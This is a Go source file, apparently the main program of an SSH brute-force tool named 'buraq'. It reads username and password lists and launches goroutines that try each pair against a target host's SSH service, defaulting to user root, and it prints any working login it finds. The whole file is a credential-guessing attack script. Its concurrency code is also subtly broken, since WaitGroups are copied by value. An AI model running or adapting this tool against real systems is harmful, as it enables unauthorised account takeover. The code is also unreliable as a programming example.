package main

/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/NovusEdge/buraq
//
// Copyright: GNU General Public License v3.0
// See the LICENSE file for more info.
//
// All Rights Reserved
*/

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"sync"
	"time"

	src "github.com/NovusEdge/buraq/src"
	utils "github.com/NovusEdge/buraq/utils"
)

func main() {
	flag.Usage = func() {
		fmt.Println(src.CommandAttackHelp)
	}

	if len(os.Args) < 2 {
		fmt.Println(utils.ColorIt(utils.ColorYellow, "[!]: No options provided!\nRun 'buraq help attack' for usage information."))
		os.Exit(0)
	}

	var t int
	var port uint
	var user string
	var proto string
	var passlist string
	var userlist string
	var timeout time.Duration

	flag.UintVar(&port, "port", 22, "Specifies the port on which target is hosting it's ssh service")

	flag.StringVar(&proto, "proto", "tcp", "Specify protocol used for the attack. (tcp/udp)")

	flag.StringVar(&user, "user", "root", "Specifies the username to use for the attack.")
	flag.StringVar(&userlist, "userlist", "", "Specifies a username-list for the attack.")

	var HOME = utils.GetHomeDirectory()
	flag.StringVar(&passlist, "passlist", HOME+"/.buraq/passlist.txt", "Specify the list of passwords to be used during the attack.")

	flag.IntVar(&t, "timeout", 500, "Specifies the timeout between each attack attempt in milliseconds.")

	flag.Parse()

	timeout = time.Duration(t) * time.Millisecond
	target := os.Args[len(os.Args)-1]

	attack(proto, target, port, user, userlist, passlist, timeout)
}

func attack(proto string, host string, port uint, username string, userlist string, passlist string, timeout time.Duration) {
	var wg sync.WaitGroup
	var usernames = []string{username}
	var passwords = []string{}

	if userlist != "" {
		content, err := ioutil.ReadFile(userlist)
		if err != nil {
			log.Fatal(err)
			os.Exit(1)
		}
		usernames = append(usernames, strings.Split(string(content), "\n")...)
	}

	pswds, e := ioutil.ReadFile(passlist)
	if e != nil {
		log.Fatal(e)
		os.Exit(1)
	}
	passwords = append(passwords, strings.Split(string(pswds), "\n")...)

	for _, u := range usernames {
		wg.Add(1)
		go attackUser(proto, host, u, passwords, timeout, port, wg)
	}
	wg.Wait()
}

func attackUser(proto, host, username string, passwords []string, timeout time.Duration, port uint, wg sync.WaitGroup) {
	var subWG sync.WaitGroup
	defer wg.Done()
	for _, p := range passwords {
		subWG.Add(1)
		go worker(proto, host, username, p, timeout, port, subWG, wg)
	}
	subWG.Wait()
}

func worker(proto, host, username string, pass string, timeout time.Duration, port uint, w sync.WaitGroup, mainWg sync.WaitGroup) {
	if ok, _ := src.AttemptConnection(proto, username, host, pass, port, timeout); ok {
		fmt.Println(utils.ColorIt(utils.ColorGreen, fmt.Sprintf("[+]: Found Working login:\n\tUsername: %s\n\tPassword: %s", username, pass)))
		mainWg.Done()
	}
	w.Done()
}
